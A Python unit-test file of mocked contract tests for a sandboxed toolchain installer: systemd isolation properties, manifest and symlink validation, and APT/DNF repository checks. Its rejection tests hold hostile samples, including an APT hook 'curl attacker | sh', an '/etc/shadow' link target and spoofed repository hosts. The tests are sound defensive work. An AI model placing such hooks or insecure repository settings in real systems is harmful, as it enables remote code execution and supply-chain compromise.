"""Bounded pure/mocked contract tests. These do not claim a Linux systemd/loop execution."""
import ast
import base64
import collections
import contextlib
import copy
import hashlib
import io
import json
import os
import pathlib
import re
import stat
import types
import unittest
from unittest import mock

RESOURCES = pathlib.Path(__file__).resolve().parents[2] / 'main/resources/gold/debug/windowstolinux/mod/deployment'
AGENT = RESOURCES / 'service/agent/toolchain'
SHARED = RESOURCES / 'linux/helper/toolchain'
OPERATION = '1234567890abcdef1234567890abcdef'


def resource(path):
    return path.read_text(encoding='utf-8').replace('\r\n', '\n')


def controller():
    source = resource(SHARED / '10-release-metadata.py') + '\n' + resource(SHARED / 'archive-boundaries.py') + '\n' + resource(AGENT / 'agent-toolchain-controller.py')
    namespace = types.ModuleType('agent_contract')
    namespace.PROGRAM_SOURCE = source.encode()
    exec(compile(source, '<actual-agent-resources>', 'exec'), namespace.__dict__)
    namespace.ROOT = pathlib.PurePosixPath('/usr/local/lib/windowstolinux/toolchains')
    namespace.SHIPPED_CATALOG = {'JAVA': ['8', '21'], 'NODE': ['22'], 'PYTHON': ['3.12'],
        'DOTNET': ['8'], 'KOTLIN': ['2.0'], 'GO': ['1.24'], 'RUST': ['1.95'], 'PHP': ['8.4'], 'RUBY': ['3.0', '3.4']}
    return namespace


def dependencies():
    text = resource(AGENT / 'dependency-packages.json')
    source = 'import json\nDEPENDENCY_PACKAGES=json.loads(' + repr(text) + ')\n' + resource(AGENT / 'agent-toolchain-dependencies.py')
    namespace = types.ModuleType('dependency_contract')
    exec(compile(source, '<actual-dependency-resources>', 'exec'), namespace.__dict__)
    return namespace, source


def info(mode=stat.S_IFREG | 0o644, inode=1, links=1, size=5, device=5):
    return types.SimpleNamespace(st_mode=mode, st_dev=device, st_ino=inode, st_nlink=links,
        st_size=size, st_uid=123, st_gid=123, st_mtime_ns=10, st_ctime_ns=10)


class AgentToolchainIsolationTest(unittest.TestCase):
    def setUp(self):
        self.c = controller()

    def rejected(self, tag, call):
        with self.assertRaises(self.c.PreparationFailure) as failure:
            call()
        self.assertEqual(tag, failure.exception.detail)

    def manifest(self):
        return {'format': 'WTL_AGENT_TOOLCHAIN_1', 'operation': OPERATION,
            'programSha256': hashlib.sha256(self.c.PROGRAM_SOURCE).hexdigest(), 'seconds': 60,
            'deadline': 999999999, 'action': 'PROBE', 'request': {'probes': [{
                'ecosystem': 'RUST', 'version': '1.95.0',
                'directory': str(self.c.ROOT) + '/versions/rust-' + 'a' * 64}], 'javaHome': '-'},
            'directories': {key: [5, index] for index, key in enumerate(('out', 'work', 'home', 'tmp'), 1)},
            'loop': '/dev/loop9', 'imageIdentity': [5, 10], 'mountIdentity': [5, 11]}

    def parse_manifest(self, value):
        fake_pathlib = types.SimpleNamespace(Path=pathlib.PurePosixPath)
        def read(path, maximum=65536):
            return self.c.PROGRAM_SOURCE if path.name == 'controller.py' else self.c.agent_encode(value)
        with mock.patch.object(self.c, 'pathlib', fake_pathlib), mock.patch.object(self.c, 'owned_directory'), mock.patch.object(self.c, 'agent_regular', read):
            return self.c.agent_manifest(OPERATION)

    def test_actual_resources_compile_without_importing_old_root_installer(self):
        self.assertTrue(callable(self.c.release))
        self.assertTrue(callable(self.c.extract))
        self.assertFalse(hasattr(self.c, 'install'))
        self.assertFalse(hasattr(self.c, 'probe'))
        self.assertFalse(hasattr(self.c, 'run'))
        d, source = dependencies()
        self.assertEqual(1, source.count('DEPENDENCY_PACKAGES='))
        actual = json.loads(resource(AGENT / 'dependency-packages.json'))
        for manager in ('APT', 'DNF'):
            for ecosystem in ('PYTHON', 'PHP', 'RUBY'):
                self.assertEqual(actual[manager][ecosystem], d.dependency_packages(manager, ecosystem))

    def test_installation_keys_match_original_all_nine_ecosystems(self):
        old = ast.parse(resource(SHARED / '30-managed-installation.py'))
        definition = next(node for node in old.body if isinstance(node, ast.FunctionDef) and node.name == 'installation_key')
        namespace = {'hashlib': hashlib, 'version_key': self.c.version_key}
        exec(compile(ast.Module(body=[definition], type_ignores=[]), '<original-key>', 'exec'), namespace)
        versions = {'JAVA': '8u412-b08', 'NODE': '22.1.0', 'PYTHON': '3.12.7', 'DOTNET': '8.0.100',
            'KOTLIN': '2.0.0', 'GO': '1.24.0', 'RUST': '1.95.0', 'PHP': '8.4.1', 'RUBY': '3.0.7'}
        for ecosystem, version in versions.items():
            with self.subTest(ecosystem=ecosystem):
                self.assertEqual(namespace['installation_key'](ecosystem, version, 'a' * 64),
                    self.c.agent_installation_key(ecosystem, version, 'a' * 64))
        self.assertNotEqual(self.c.agent_installation_key('RUBY', '3.0.7', 'a' * 64),
            hashlib.sha256(('RUBY\n3.0.7\n' + 'a' * 64).encode()).hexdigest())

    def test_manifest_rejects_duplicate_trailing_unknown_and_source_mismatch(self):
        for payload in (b'{"operation":"a","operation":"b"}', b'{} trailing', b'{"x":NaN}'):
            with self.subTest(payload=payload), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_json(payload)
        good = self.manifest()
        self.assertEqual(good, self.parse_manifest(good))
        bad = copy.deepcopy(good)
        bad['additional'] = True
        self.rejected('MANIFEST_SCHEMA', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['programSha256'] = 'b' * 64
        self.rejected('PROGRAM_BINDING', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['request']['callback'] = '/bin/sh'
        self.rejected('PROBE_SCHEMA', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['seconds'] = True
        self.rejected('MANIFEST_DEADLINE', lambda: self.parse_manifest(bad))
        bad = copy.deepcopy(good)
        bad['directories']['work'] = [0, 1]
        self.rejected('MANIFEST_DIRECTORY_INODE', lambda: self.parse_manifest(bad))

    def test_every_vendor_probe_is_rejected_at_root_before_process_creation(self):
        with mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c.subprocess, 'Popen') as popen:
            for ecosystem in self.c.AGENT_ECOSYSTEMS:
                with self.subTest(ecosystem=ecosystem):
                    self.rejected('ROOT_VENDOR_EXECUTION_FORBIDDEN',
                        lambda: self.c.agent_probe(ecosystem, '/vendor', '3.0.0', '-'))
            self.rejected('WORKER_REQUIRES_NONROOT', lambda: self.c.agent_worker(OPERATION))
            popen.assert_not_called()

    def test_unit_limits_identity_socket_isolation_and_real_prefix_are_fixed(self):
        manifest = self.manifest()
        manifest['action'] = 'INSTALL'
        manifest['request'] = {'destination': str(self.c.ROOT) + '/versions/rust-' + 'a' * 64}
        properties = self.c.agent_sandbox_properties(manifest)
        for expected in ('DynamicUser=yes', 'NoNewPrivileges=yes', 'CapabilityBoundingSet=',
                'AmbientCapabilities=', 'PrivateNetwork=yes', 'RestrictNamespaces=yes',
                'Delegate=no', 'KillMode=control-group', 'MemoryMax=2147483648', 'TasksMax=256'):
            self.assertIn(expected, properties)
        self.assertIn('User=' + self.c.agent_user(OPERATION), properties)
        self.assertIn('TemporaryFileSystem=/run:ro', properties)
        self.assertIn('WorkingDirectory=/', properties)
        bind = next(v for v in properties if v.startswith('BindPaths='))
        self.assertIn('mutable/out:' + manifest['request']['destination'], bind)
        for prefix in ('ExecStartPre=+', 'ExecStopPost=+'):
            callback = next(v for v in properties if v.startswith(prefix))
            self.assertIn('/usr/bin/python3 -I -S -c ', callback)
            self.assertNotIn('install.sh', callback)
        self.assertEqual('windowstolinux-toolchain-' + OPERATION + '.service', self.c.agent_unit(OPERATION))
        self.assertTrue(any('-/run/dbus' in v and '-/var/opt/windowstolinux/apps' in v for v in properties))

    def test_output_links_cannot_escape_through_chain_or_absolute_target(self):
        names = {'bin', 'bin/tool', 'lib', 'lib/version'}
        self.assertEqual('lib/version', self.c.agent_resolve_link('bin/tool', '../lib/version', {}, names))
        for target, links in (('/etc/shadow', {}), ('../../outside', {}),
                ('alias/file', {'alias': '../../outside'}), ('loop', {'bin/loop': 'loop'})):
            with self.subTest(target=target), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_resolve_link('bin/tool', target, links, names)

    def test_promotion_rejects_special_setid_capabilities_and_external_hardlinks(self):
        for entry in (info(stat.S_IFIFO | 0o600), info(stat.S_IFCHR | 0o600),
                info(stat.S_IFREG | 0o4755), info(device=6)):
            with self.subTest(mode=entry.st_mode), self.assertRaises(self.c.PreparationFailure):
                self.c.agent_validate_entry(entry, 5)
        self.rejected('UNSAFE_OUTPUT_METADATA', lambda: self.c.agent_validate_entry(info(), 5, b'cap'))
        self.rejected('EXTERNAL_OUTPUT_HARDLINK', lambda: self.c.agent_validate_tree({'tool': (info(links=2), None)}))
        self.c.agent_validate_tree({'a': (info(links=2), None), 'b': (info(links=2), None)})
        self.rejected('VENDOR_COMPLETION_MARKER', lambda: self.c.agent_validate_tree({'.w2l-toolchain.json': (info(), None)}))
        self.rejected('EMPTY_OUTPUT', lambda: self.c.agent_validate_tree({}))

    def test_nonmatching_frozen_receipt_and_unknown_unit_never_confirm_stop(self):
        manifest = self.manifest()
        fixed = b'LoadState=not-found\nActiveState=inactive\nControlGroup=\n'
        for output, receipt in ((b'', {}), (fixed, {'operation': 'f' * 32}),
                (fixed + b'ActiveState=inactive\n', {})):
            with self.subTest(output=output), mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), mock.patch.object(self.c, 'agent_os', return_value=(0, output)), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(receipt).encode()), mock.patch.object(self.c, 'agent_volume') as volume:
                with self.assertRaises(self.c.PreparationFailure):
                    self.c.agent_stopped(manifest)
                volume.assert_not_called()

    def test_failed_freeze_overrides_worker_success_without_publishing(self):
        manifest = self.manifest()
        with mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), mock.patch.object(self.c, 'agent_write'), mock.patch.object(self.c, 'agent_os', return_value=(0, ('WORKER_OK=' + manifest['programSha256'] + '\n').encode())), mock.patch.object(self.c, 'agent_stopped', side_effect=self.c.PreparationFailure('unknown', 'VOLUME_NOT_FROZEN')), mock.patch.object(self.c, 'agent_promote') as promote:
            self.rejected('VOLUME_NOT_FROZEN', lambda: self.c.agent_execute(manifest))
            promote.assert_not_called()

    def test_existing_operation_is_not_reused_or_removed(self):
        class ExistingPath:
            name = 'work'
            def __truediv__(self, _): return self
            def mkdir(self, **_): pass
            def exists(self): return True
        existing = ExistingPath()
        with mock.patch.dict('sys.modules', {'pwd': types.SimpleNamespace()}), mock.patch.object(self.c, 'ROOT', existing), mock.patch.object(self.c, 'agent_operation', return_value=existing), mock.patch.object(self.c, 'owned_directory'), mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c, 'agent_os') as commands:
            self.rejected('OPERATION_ALREADY_EXISTS', lambda: self.c.agent_create(OPERATION, 60))
            commands.assert_not_called()
        for value in ('../escape', 'A' * 32, OPERATION + '/extra'):
            self.rejected('OPERATION_ID', lambda: self.c.agent_operation(value))

    def test_started_operation_is_never_cleaned_as_prestart(self):
        class StartedPath:
            def __truediv__(self, _): return self
            def exists(self): return True
        with mock.patch.object(self.c, 'agent_operation', return_value=StartedPath()), mock.patch.object(self.c, 'agent_os') as commands:
            self.assertFalse(self.c.agent_cleanup_before_start(self.manifest()))
            commands.assert_not_called()

    def test_cached_managed_installation_must_match_all_official_metadata(self):
        manifest = self.manifest()
        expected = 'a' * 64
        key = self.c.agent_installation_key('RUST', '1.95.0', expected)
        class Directory:
            def __init__(self, path): self.path = path
            def __str__(self): return self.path
            def __truediv__(self, part): return Directory(self.path + '/' + part)
            def exists(self): return True
        root = Directory('/usr/local/lib/windowstolinux/toolchains')
        directory = str(root / 'versions' / ('rust-' + key))
        record = {'ecosystem': 'RUST', 'version': '1.95.0', 'directory': directory, 'origin': 'MANAGED',
            'source': 'https://static.rust-lang.org/archive', 'official_algorithm': 'sha256',
            'official_digest': expected, 'sha256': expected}
        for field, bad in (('origin', 'SYSTEM'), ('source', 'https://github.com/different'),
                ('official_algorithm', 'sha512'), ('official_digest', 'b' * 64),
                ('version', '1.94.0'), ('directory', '/other'), ('sha256', 'b' * 64)):
            changed = dict(record, **{field: bad})
            with self.subTest(field=field), mock.patch.object(self.c, 'ROOT', root), mock.patch.object(self.c, 'agent_system', return_value=None), mock.patch.object(self.c, 'agent_record', return_value=changed), mock.patch.object(self.c, 'agent_probe_records') as probe:
                self.rejected('EXISTING_INSTALLATION_MISMATCH', lambda: self.c.agent_prepare_selected(
                    manifest, 'RUST', '1.95.0', record['source'], 'sha256', expected, 'rust', '-'))
                probe.assert_not_called()

    def test_setup_only_chowns_four_original_empty_directories_to_positive_nss_identity(self):
        manifest = self.manifest()
        identity = {'operation': OPERATION, 'uid': 0, 'gid': 0, 'programSha256': manifest['programSha256']}
        descriptors, changes = {}, []
        def opening(path, flags):
            fd = len(descriptors) + 10
            descriptors[fd] = pathlib.PurePosixPath(path).name
            return fd
        def stat_fd(fd):
            name = descriptors[fd]
            return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories'][name][1],
                st_uid=0, st_mode=stat.S_IFDIR | 0o755)
        nss = types.SimpleNamespace(getpwnam=lambda _: types.SimpleNamespace(pw_uid=1234, pw_gid=1234))
        with (mock.patch.dict('sys.modules', {'pwd': nss}),
              mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True),
              mock.patch.object(self.c, 'agent_manifest', return_value=manifest),
              mock.patch.object(self.c, 'agent_volume'),
              mock.patch.object(self.c.os, 'O_DIRECTORY', 0x10000, create=True),
              mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(identity).encode()),
              mock.patch.object(self.c.os, 'open', opening), mock.patch.object(self.c.os, 'fstat', stat_fd),
              mock.patch.object(self.c.os, 'listdir', return_value=[]),
              mock.patch.object(self.c.os, 'fchown', lambda fd, uid, gid: changes.append((descriptors[fd], uid, gid)), create=True),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'ftruncate'),
              mock.patch.object(self.c.os, 'write'), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close')):
            self.c.agent_setup(OPERATION)
        self.assertEqual([(name, 1234, 1234) for name in ('out', 'work', 'home', 'tmp')], changes)
        nss.getpwnam = lambda _: types.SimpleNamespace(pw_uid=0, pw_gid=0)
        with mock.patch.dict('sys.modules', {'pwd': nss}), mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.c, 'agent_manifest', return_value=manifest), mock.patch.object(self.c, 'agent_volume'), mock.patch.object(self.c.os, 'fchown', create=True) as chown:
            self.rejected('DYNAMIC_IDENTITY', lambda: self.c.agent_setup(OPERATION))
            chown.assert_not_called()

    def test_install_and_final_probe_all_layouts_execute_only_in_nonroot_worker(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, value): self.value = str(value)
            def __truediv__(self, name): return Path(self.value + '/' + name)
            def __str__(self): return self.value
            def lstat(self):
                name = self.value.rsplit('/', 1)[-1]
                return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories'][name][1],
                    st_uid=123, st_mode=stat.S_IFDIR | 0o700)
            def stat(self):
                return types.SimpleNamespace(st_dev=5, st_ino=manifest['directories']['out'][1])
            def read_text(self): return 'CapEff:\t0000000000000000\nNoNewPrivs:\t1\n'
        versions = {'JAVA': '21.0.1', 'NODE': '22.1.0', 'PYTHON': '3.12.7', 'DOTNET': '8.0.100',
            'KOTLIN': '2.0.0', 'GO': '1.24.0', 'RUST': '1.95.0', 'PHP': '8.4.1', 'RUBY': '3.0.7'}
        layouts = {'JAVA': 'archive', 'NODE': 'archive', 'PYTHON': 'python', 'DOTNET': 'flat',
            'KOTLIN': 'archive', 'GO': 'archive', 'RUST': 'rust', 'PHP': 'php', 'RUBY': 'ruby'}
        for ecosystem, version in versions.items():
            manifest['action'] = 'INSTALL'
            manifest['request'] = {'ecosystem': ecosystem, 'version': version, 'destination': '/final/' + ecosystem,
                'layout': layouts[ecosystem], 'javaHome': '-', 'legacyGem': ecosystem == 'RUBY'}
            commands = []
            def vendor(command, environment, cwd=None, capture=False):
                self.assertEqual(123, self.c.os.geteuid())
                self.assertEqual('/final/' + ecosystem + '/bin', environment['PATH'].split(':')[0])
                commands.append(command)
                return version if capture else ''
            identity = {'operation': OPERATION, 'uid': 123, 'gid': 123, 'programSha256': manifest['programSha256']}
            with self.subTest(ecosystem=ecosystem), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'AGENT_ALIAS', Path('/run/wtl-agent-toolchain')), mock.patch.object(self.c, 'agent_manifest', return_value=manifest), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(identity).encode()), mock.patch.object(self.c.os, 'geteuid', return_value=123, create=True), mock.patch.object(self.c.os, 'getuid', return_value=123, create=True), mock.patch.object(self.c.os, 'getgid', return_value=123, create=True), mock.patch.object(self.c.os, 'chdir') as chdir, mock.patch.object(self.c.shutil, 'copytree'), mock.patch.object(self.c.os, 'walk', return_value=[]), mock.patch.object(self.c, 'agent_vendor', vendor), contextlib.redirect_stdout(io.StringIO()):
                self.c.agent_worker(OPERATION)
                chdir.assert_called_once_with('/run/wtl-agent-toolchain/work')
            self.assertTrue(any(command[0].startswith('/final/' + ecosystem) for command in commands))
            if layouts[ecosystem] in ('python', 'php', 'ruby'):
                self.assertTrue(any('--prefix=/final/' + ecosystem in command for command in commands))
                self.assertTrue(any(command == ['/usr/bin/make', 'install'] for command in commands))
            if ecosystem == 'RUST':
                self.assertTrue(any('--disable-ldconfig' in command for command in commands))
            if ecosystem == 'RUBY':
                self.assertTrue(any('--local' in command and '--ignore-dependencies' in command for command in commands))

    def test_internal_hardlinks_are_copied_to_independent_exclusive_output_files(self):
        entry = info(links=2, size=4)
        entries = {'a': (entry, None), 'b': (entry, None)}
        opened, reads, content = [], collections.defaultdict(int), {}
        def opening(name, flags, mode=None, dir_fd=None):
            target = dir_fd == 2
            fd = (20 if target else 10) + ('a', 'b').index(name)
            opened.append((name, target, flags, fd))
            return fd
        def reading(fd, _):
            reads[fd] += 1
            return b'data' if reads[fd] == 1 else b''
        class Sink:
            def __init__(self, fd): self.fd = fd
            def __enter__(self): return self
            def __exit__(self, *_): pass
            def write(self, value): content[self.fd] = content.get(self.fd, b'') + value
        with (mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c.os, 'listdir', return_value=['a', 'b']),
              mock.patch.object(self.c.os, 'stat', return_value=entry),
              mock.patch.object(self.c.os, 'fstat', return_value=entry),
              mock.patch.object(self.c.os, 'open', opening), mock.patch.object(self.c.os, 'read', reading),
              mock.patch.object(self.c.os, 'dup', side_effect=lambda fd: fd),
              mock.patch.object(self.c.os, 'fdopen', side_effect=lambda fd, _: Sink(fd)),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close'), mock.patch.object(self.c.os, 'link') as link):
            digest = self.c.agent_copy_tree(1, 2, entries)
        self.assertEqual({20: b'data', 21: b'data'}, content)
        self.assertTrue(all(flags & os.O_EXCL for _, target, flags, _ in opened if target))
        self.assertRegex(digest, r'^[a-f0-9]{64}$')
        link.assert_not_called()

    def test_detach_failure_leaves_only_hidden_stage_and_never_renames_visible_marker(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, path): self.path = str(path)
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return False
            def is_symlink(self): return False
            def mkdir(self, **_): pass
            def iterdir(self): return iter(())
        destination = Path('/root/versions/rust-final')
        writes = []
        with (mock.patch.object(self.c, 'ROOT', Path('/root')),
              mock.patch.object(self.c, 'agent_stopped'),
              mock.patch.object(self.c, 'agent_identity', return_value=[5, 1]),
              mock.patch.object(self.c.os, 'O_DIRECTORY', 0x10000, create=True),
              mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c.os, 'open', return_value=99),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close'), mock.patch.object(self.c, 'agent_scan', return_value={'x': (info(), None)}),
              mock.patch.object(self.c, 'agent_copy_tree', return_value='a' * 64),
              mock.patch.object(self.c, 'agent_write', side_effect=lambda path, _: writes.append(str(path))),
              mock.patch.object(self.c, 'agent_detach', side_effect=self.c.PreparationFailure('unknown', 'VOLUME_STILL_ATTACHED')),
              mock.patch.object(self.c.os, 'rename') as rename):
            self.rejected('VOLUME_STILL_ATTACHED', lambda: self.c.agent_promote(manifest, destination, [5, 1], {}))
        self.assertEqual(1, len(writes))
        self.assertIn('/.agent-promote-' + OPERATION + '/', writes[0])
        rename.assert_not_called()

    def test_failed_official_download_does_not_create_final_key_placeholder(self):
        manifest = self.manifest()
        created = []
        class Path:
            def __init__(self, value): self.value = str(value)
            def __str__(self): return self.value
            def __truediv__(self, part): return Path(self.value + '/' + part)
            def exists(self): return False
            def is_symlink(self): return False
            def mkdir(self, **_): created.append(self.value)
        with mock.patch.object(self.c, 'ROOT', Path('/root')), mock.patch.object(self.c, 'agent_system', return_value=None), mock.patch.object(self.c, 'agent_release_source', side_effect=self.c.PreparationFailure('network', 'DOWNLOAD_FAILED')), mock.patch.object(self.c, 'agent_execute') as execute:
            self.rejected('DOWNLOAD_FAILED', lambda: self.c.agent_prepare_selected(manifest, 'RUST',
                '1.95.0', 'https://static.rust-lang.org/archive', 'sha256', 'a' * 64, 'rust', '-'))
        self.assertEqual([], created)
        execute.assert_not_called()

    def test_placeholder_cleanup_is_exact_current_operation_inode_and_empty_only(self):
        manifest = self.manifest()
        target = str(self.c.ROOT) + '/versions/rust-' + 'a' * 64
        record = {'operation': OPERATION, 'ecosystem': 'RUST', 'version': '1.95.0',
            'directory': target, 'identity': [5, 9]}
        removed = []
        nonempty = []
        class Path:
            def __init__(self, path): self.path = path
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return True
            def iterdir(self): return iter(nonempty)
            def rmdir(self): removed.append(self.path)
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'agent_regular', side_effect=lambda _: json.dumps(record).encode()), mock.patch.object(self.c, 'agent_selection'), mock.patch.object(self.c, 'agent_identity', return_value=[5, 9]):
            self.c.agent_cleanup_placeholder(manifest)
            self.assertEqual([target], removed)
            nonempty.append('unsettled')
            self.rejected('PLACEHOLDER_CHANGED', lambda: self.c.agent_cleanup_placeholder(manifest))
            nonempty.clear()
            record['operation'] = 'f' * 32
            self.rejected('PLACEHOLDER_BINDING', lambda: self.c.agent_cleanup_placeholder(manifest))
        record['operation'] = OPERATION
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(record).encode()), mock.patch.object(self.c, 'agent_selection'), mock.patch.object(self.c, 'agent_identity', return_value=[5, 99]):
            self.rejected('PLACEHOLDER_CHANGED', lambda: self.c.agent_cleanup_placeholder(manifest))
        self.assertEqual([target], removed)

    def test_prestart_cleanup_only_runs_before_any_unit_intent(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, path): self.path = path
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return False
            def is_symlink(self): return False
            def iterdir(self): return iter(())
            def unlink(self): calls.append('unlink:' + self.path)
        calls = []
        original = {'operation': OPERATION, 'uid': 0, 'gid': 0, 'programSha256': manifest['programSha256']}
        def command(args, **_):
            calls.append(args)
            return 0, b'not-found\n' if 'systemctl' in args[0] else b''
        def inode(path):
            return manifest['directories'][str(path).rsplit('/', 1)[-1]]
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(original).encode()), mock.patch.object(self.c, 'agent_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.c, 'agent_os', command), mock.patch.object(self.c, 'agent_volume'), mock.patch.object(self.c, 'agent_identity', inode), mock.patch.object(self.c, 'agent_write'):
            self.assertTrue(self.c.agent_cleanup_before_start(manifest))
        verbs = [value[0].rsplit('/', 1)[-1] for value in calls if isinstance(value, list)]
        self.assertEqual(['systemctl', 'mount', 'umount', 'findmnt', 'losetup', 'losetup'], verbs)
        self.assertEqual('unlink:/root/current/volume.ext4', calls[-1])


class AgentToolchainDependenciesTest(unittest.TestCase):
    def setUp(self):
        self.d, self.source = dependencies()
        self.d.OS_PROFILE = {'id': 'ubuntu', 'version': '24.04', 'manager': 'APT'}

    def rejected(self, call):
        with self.assertRaises(self.d.DependencyFailure):
            call()

    def test_apt_authentication_relaxation_and_custom_hook_are_rejected(self):
        for value in ('deb [trusted=yes] https://archive.ubuntu.com/ubuntu noble main',
                'APT::Get::AllowUnauthenticated "true";',
                'Acquire::AllowInsecureRepositories "true";',
                'Acquire::https::Verify-Peer "false";',
                'APT::Update::Post-Invoke {"curl attacker | sh";};',
                'Dir::Etc::sourceparts "/project";'):
            with self.subTest(value=value):
                self.rejected(lambda: self.d.dependency_apt_options(value))
        self.assertEqual(1, self.d.dependency_apt_sources('deb https://archive.ubuntu.com/ubuntu noble main'))
        self.d.OS_PROFILE = {'id': 'debian', 'version': '13', 'manager': 'APT'}
        self.assertEqual(1, self.d.dependency_apt_sources('Types: deb\nURIs: https://deb.debian.org/debian\nSuites: stable\nComponents: main\n'))

    def test_dnf_authentication_and_untrusted_source_are_rejected(self):
        self.d.OS_PROFILE = {'id': 'centos', 'version': '9', 'manager': 'DNF'}
        base = '[baseos]\nbaseurl=https://mirror.stream.centos.org/$stream/BaseOS/$basearch/os/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n'
        with mock.patch.object(self.d, 'dependency_key'):
            self.assertEqual(1, self.d.dependency_dnf_config(base, True))
            for value in (base.replace('gpgcheck=1', 'gpgcheck=0'), base + 'sslverify=0\n',
                    base.replace('mirror.stream.centos.org', 'attacker.example'), base + 'reposdir=/project\n'):
                self.rejected(lambda: self.d.dependency_dnf_config(value, True))

    def test_package_versions_are_complete_exact_unique_and_bounded(self):
        packages = self.d.dependency_packages('APT', 'RUBY')
        output = ''.join(package + '\t1:2.3-4ubuntu5\n' for package in packages)
        self.assertEqual(set(packages), set(self.d.dependency_versions(output, packages)))
        for value in (output + packages[0] + '\t1\n', output + 'model-package\t1\n',
                output.splitlines()[0] + '\n', output.replace('1:2.3-4ubuntu5', 'secret\ntrailer', 1)):
            self.rejected(lambda: self.d.dependency_versions(value, packages))

    def test_transaction_uses_actual_packaged_names_forces_auth_and_has_one_receipt(self):
        packages = self.d.dependency_packages('APT', 'PHP')
        commands = []
        def run(command):
            commands.append(command)
            return ''.join(name + '\t1.0-1\n' for name in packages) if 'dpkg-query' in command[0] else ''
        stream = io.StringIO()
        with mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.d, 'dependency_profile', return_value=self.d.OS_PROFILE), mock.patch.object(self.d, 'dependency_validate_apt'), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run), contextlib.redirect_stdout(stream):
            self.d.dependency_main(['PHP', OPERATION])
        line = stream.getvalue()
        self.assertEqual(1, len(line.splitlines()))
        value = json.loads(line.removeprefix('TOOLCHAIN_DEPENDENCIES='))
        self.assertEqual({'operation', 'ecosystem', 'manager', 'packages'}, set(value))
        self.assertEqual(OPERATION, value['operation'])
        self.assertEqual(set(packages), set(value['packages']))
        transaction = next(command for command in commands if 'install' in command)
        self.assertEqual(packages, transaction[-len(packages):])
        self.assertIn('APT::Get::AllowUnauthenticated=false', transaction)
        self.assertIn('Acquire::AllowInsecureRepositories=false', transaction)
        self.assertFalse(any('--allow-unauthenticated' in command for command in commands))

    def test_non_source_ecosystem_does_not_install_and_arbitrary_args_are_rejected(self):
        with mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.d, 'dependency_run') as commands, contextlib.redirect_stdout(io.StringIO()):
            self.d.dependency_main(['RUST', OPERATION])
            commands.assert_not_called()
            for args in (['RUBY', OPERATION, '--repo=attacker'], ['RUBY', '../op'], ['MODEL', OPERATION]):
                self.rejected(lambda: self.d.dependency_main(args))

    def test_os_profile_and_cross_distribution_sources_are_strict(self):
        for identity, version, manager in (('ubuntu', '24.04', 'APT'), ('debian', '12', 'APT'), ('centos', '10', 'DNF')):
            with mock.patch.object(self.d, 'dependency_text', return_value='ID=' + identity + '\nVERSION_ID="' + version + '"\n'):
                self.assertEqual(manager, self.d.dependency_profile()['manager'])
        for release in ('ID=ubuntu\nVERSION_ID=26.04\n', 'ID=model\nVERSION_ID=24.04\n',
                'ID=ubuntu\nID=debian\nVERSION_ID=12\n'):
            with mock.patch.object(self.d, 'dependency_text', return_value=release):
                self.rejected(self.d.dependency_profile)
        self.rejected(lambda: self.d.dependency_url('https://deb.debian.org/debian', 'APT'))
        self.rejected(lambda: self.d.dependency_url('https://archive.ubuntu.com.evil/ubuntu', 'APT'))

    def test_default_apt_paths_are_accepted_and_binary_overrides_rejected(self):
        defaults = 'Dir "/";\nDir::Etc "etc/apt";\nDir::Etc::sourcelist "sources.list";\nDir::Etc::sourceparts "sources.list.d";\nDir::Etc::trusted "trusted.gpg";\nDir::Etc::trustedparts "trusted.gpg.d";\nDir::Bin::dpkg "/usr/bin/dpkg";\n'
        self.d.dependency_apt_options(defaults, effective=True)
        for value in (defaults.replace('"sources.list.d"', '"/project/repos"'),
